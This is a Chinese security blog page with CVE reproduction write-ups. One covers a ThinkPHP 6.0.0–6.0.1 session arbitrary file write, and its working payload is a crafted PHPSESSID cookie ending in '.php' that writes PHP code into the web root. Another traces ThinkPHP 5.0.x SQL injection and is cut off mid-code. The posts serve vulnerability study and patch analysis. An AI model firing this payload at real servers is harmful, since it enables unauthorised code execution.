<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>ccreaterのblog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="ccreaterのblog">
<meta property="og:url" content="https://site.ccreater.top/page/8/index.html">
<meta property="og:site_name" content="ccreaterのblog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="ccreaterのblog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">ccreaterのblog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://site.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-ThinkPHP6 任意文件操作漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/01/31/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
  <time class="dt-published" datetime="2020-01-31T16:00:00.000Z" itemprop="datePublished">2020-02-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/01/31/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP6 任意文件操作漏洞分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP6-任意文件操作漏洞分析"><a href="#ThinkPHP6-任意文件操作漏洞分析" class="headerlink" title="ThinkPHP6 任意文件操作漏洞分析"></a>ThinkPHP6 任意文件操作漏洞分析</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
<li>ThinkPHP6.0.0-6.0.1</li>
<li>开启Sessoin中间件</li>
</ol>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>官方commit: <a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a> </p>
<p>复现环境为:phpstudy+thinkphp6.0.1</p>
<p><code>\app\controller\index.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Session</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Session::set(<span class="string">&#x27;name&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello,&#x27;</span> . Session::get(<span class="string">&#x27;name&#x27;</span>);;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>\app\middleware.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 全局中间件定义文件</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 全局请求缓存</span></span><br><span class="line">    <span class="comment">// \think\middleware\CheckRequestCache::class,</span></span><br><span class="line">    <span class="comment">// 多语言加载</span></span><br><span class="line">    <span class="comment">// \think\middleware\LoadLangPack::class,</span></span><br><span class="line"><span class="comment">//     Session初始化</span></span><br><span class="line">     \think\middleware\SessionInit::class</span><br><span class="line">];</span><br></pre></td></tr></table></figure>





<p>根据漏洞的信息(任意文件操作),我们从<code>vendor\topthink\framework\src\think\session\Store.php</code> 的<code>save</code>函数开始进行分析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;clearFlashData();<span class="comment">//清除原来的数据</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$sessionId</span> = <span class="keyword">$this</span>-&gt;getId();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler-&gt;write(<span class="variable">$sessionId</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler-&gt;delete(<span class="variable">$sessionId</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;init = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>$this-&gt;handler-&gt;write</code>方法看一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$sessID</span>, <span class="keyword">string</span> <span class="variable">$sessData</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;getFileName(<span class="variable">$sessID</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$data</span>     = <span class="variable">$sessData</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            <span class="variable">$data</span> = gzcompress(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;writeFile(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再跟进<code>$this-&gt;writeFile</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$content</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">bool</span>) file_put_contents(<span class="variable">$path</span>, <span class="variable">$content</span>, LOCK_EX);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>因为<code>$data</code>可控,那么我们只要能控制<code>$path</code>我们就可以写shell进去了</p>
<p>而<code>$path</code>由<code>$this-&gt;getFileName($sessID, true);</code>得到</p>
<p>跟进去</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFileName</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span>, <span class="keyword">bool</span> <span class="variable">$auto</span> = <span class="literal">false</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;prefix&#x27;</span>]) &#123;</span><br><span class="line">           <span class="comment">// 使用子目录</span></span><br><span class="line">           <span class="variable">$name</span> = <span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;prefix&#x27;</span>] . DIRECTORY_SEPARATOR . <span class="string">&#x27;sess_&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="variable">$name</span> = <span class="string">&#x27;sess_&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;path&#x27;</span>] . <span class="variable">$name</span>;</span><br><span class="line">       <span class="variable">$dir</span>      = dirname(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$auto</span> &amp;&amp; !is_dir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               mkdir(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">           &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">               <span class="comment">// 创建失败</span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$filename</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><code>$filename</code>直接由末端拼接参数<code>$name</code></p>
<p>而<code>write</code>调用<code>getFileName</code>时直接将参数<code>$sessID</code>传入,<code>$sessID</code>由<code>$sessionId = $this-&gt;getId();</code>获得</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getId</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><code>$this-&gt;id</code>时通过<code>setId()</code>来设置的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setId</span>(<span class="params"><span class="variable">$id</span> = <span class="literal">null</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;id = is_string(<span class="variable">$id</span>) &amp;&amp; strlen(<span class="variable">$id</span>) === <span class="number">32</span> ? <span class="variable">$id</span> : md5(microtime(<span class="literal">true</span>) . session_create_id());</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>is_string($id) &amp;&amp; strlen($id) === 32 </code>满足,则直接将<code>$id</code>的值赋给<code>$this-&gt;id</code></p>
<p>查找调用setId的函数</p>
<p><img src="https://i.loli.net/2020/02/01/cAes3Wot8BFbkjP.png" alt="image3070"></p>
<p>其中<code>SessionInit</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$request</span>, <span class="built_in">Closure</span> <span class="variable">$next</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">// Session初始化</span></span><br><span class="line">       <span class="variable">$varSessionId</span> = <span class="keyword">$this</span>-&gt;app-&gt;config-&gt;get(<span class="string">&#x27;session.var_session_id&#x27;</span>);</span><br><span class="line">       <span class="variable">$cookieName</span>   = <span class="keyword">$this</span>-&gt;session-&gt;getName();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$varSessionId</span> &amp;&amp; <span class="variable">$request</span>-&gt;request(<span class="variable">$varSessionId</span>)) &#123;</span><br><span class="line">           <span class="variable">$sessionId</span> = <span class="variable">$request</span>-&gt;request(<span class="variable">$varSessionId</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="variable">$sessionId</span> = <span class="variable">$request</span>-&gt;cookie(<span class="variable">$cookieName</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$sessionId</span>) &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;session-&gt;setId(<span class="variable">$sessionId</span>);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查找配置发现<code>$sessionId</code>=&gt;<code>$_COOKIE[&#39;PHPSESSID&#39;]</code></p>
<p>因此构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp/public/index.php?s=/index/index/&amp;name=%3C?php%20phpinfo();?%3E</span><br><span class="line"></span><br><span class="line">Cookie :PHPSESSID=9f7777c08f3909751b148338ba08.php</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1/tp/runtime/session/sess_9f7777c08f3909751b148338ba08.php</span><br></pre></td></tr></table></figure>



<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setId</span>(<span class="params"><span class="variable">$id</span>=<span class="literal">null</span></span>):<span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;id = is_string(<span class="variable">$id</span>) &amp;&amp; strlen(<span class="variable">$id</span>) === <span class="number">32</span> &amp;&amp; ctype_alnum(<span class="variable">$id</span>) ? <span class="variable">$id</span> : md5(microtime(<span class="literal">true</span>) . session_create_id());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>setId</code>中增加了对<code>$id</code>的校验:<code>ctype_alnum($id)</code>,只允许数字或字母,来避免任意文件操作</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://paper.seebug.org/1114/#_1">https://paper.seebug.org/1114/#_1</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/01/31/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="cku8k8fx9002kd0ob42zl02u2" data-title="ThinkPHP6 任意文件操作漏洞分析" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ThinkPHP框架5.0.x_SQL注入分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/01/31/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" class="article-date">
  <time class="dt-published" datetime="2020-01-31T16:00:00.000Z" itemprop="datePublished">2020-02-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/01/31/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">ThinkPHP框架5.0.x_SQL注入分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP框架5-0-x-SQL注入分析-amp-数据库配置泄露"><a href="#ThinkPHP框架5-0-x-SQL注入分析-amp-数据库配置泄露" class="headerlink" title="ThinkPHP框架5.0.x SQL注入分析 &amp; 数据库配置泄露"></a>ThinkPHP框架5.0.x SQL注入分析 &amp; 数据库配置泄露</h1><h2 id="应用范围"><a href="#应用范围" class="headerlink" title="应用范围"></a>应用范围</h2><p>开启debug模式的thinkphp5.0.x</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>从官网上下载5.0.9完整版</p>
<p><code>application/index/controller/index.php</code>内容如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">model</span>\<span class="title">Gather</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ids</span> = input(<span class="string">&#x27;ids/a&#x27;</span>);</span><br><span class="line">        <span class="variable">$t</span> = db(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$t</span>-&gt;where(<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;in&#x27;</span>, <span class="variable">$ids</span>)-&gt;select();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/02/01/8hmETeuW31p5Zb6.png" alt="image460"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们在漏洞的关键位置下个断点进行分析,<code>thinkphp\library\think\db\Builder.php</code>:383行</p>
<p>调用堆栈为:</p>
<p><img src="https://i.loli.net/2020/02/01/YFfV74U8cxTLS2H.png" alt="image609"></p>
<p>从index()方法开始</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ids</span> = input(<span class="string">&#x27;ids/a&#x27;</span>);</span><br><span class="line">        <span class="variable">$t</span> = db(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$t</span>-&gt;where(<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;in&#x27;</span>, <span class="variable">$ids</span>)-&gt;select();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>调用<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>返回值的select()方法</p>
<p>我们先看下select()方法,它会将<code>$option</code>作为参数调用<code>Builder::select</code>方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$data</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	...</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 分析查询表达式</span></span><br><span class="line">        <span class="variable">$options</span> = <span class="keyword">$this</span>-&gt;parseExpress();</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$resultSet</span>) &#123;</span><br><span class="line">            <span class="comment">// 生成查询SQL</span></span><br><span class="line">            <span class="variable">$sql</span> = <span class="keyword">$this</span>-&gt;builder-&gt;select(<span class="variable">$options</span>);</span><br><span class="line">            <span class="comment">// 获取参数绑定</span></span><br><span class="line">            ...</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ...</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们跟进<code>$this-&gt;parseExpress();</code>看<code>$option</code>是如何生成的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseExpress</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$options</span> = <span class="keyword">$this</span>-&gt;options;</span><br><span class="line">    	...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里是直接令<code>$options = $this-&gt;options;</code>,而<code>$this-&gt;options</code>是<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>过程生成的</p>
<p>跟进去发现有这一条语句 <code>$this-&gt;options[&#39;where&#39;][$logic] = array_merge($this-&gt;options[&#39;where&#39;][$logic], $where);</code>,其中<code>$where</code>由<code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code>得到</p>
<p>获得<code>$option</code>的调用链为:</p>
<p><code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code> ( <code>public function where($field, $op = null, $condition = null) </code> ) =&gt; <code>$this-&gt;parseWhereExp(&#39;AND&#39;, $field, $op, $condition, $param);</code>  =&gt; <code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code> </p>
<p>我们回到<code>$this-&gt;builder-&gt;select($options);</code>,现在我们知道<code>$this-&gt;options[&#39;where&#39;][$logic]</code>是我们的可控位置</p>
<p>跟进去</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = str_replace(</span><br><span class="line">            [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%GROUP%&#x27;</span>, <span class="string">&#x27;%HAVING%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%UNION%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>, <span class="string">&#x27;%FORCE%&#x27;</span>],</span><br><span class="line">            [</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseTable(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>], <span class="variable">$options</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseDistinct(<span class="variable">$options</span>[<span class="string">&#x27;distinct&#x27;</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseField(<span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>], <span class="variable">$options</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseJoin(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>], <span class="variable">$options</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseWhere(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>], <span class="variable">$options</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseGroup(<span class="variable">$options</span>[<span class="string">&#x27;group&#x27;</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseHaving(<span class="variable">$options</span>[<span class="string">&#x27;having&#x27;</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseOrder(<span 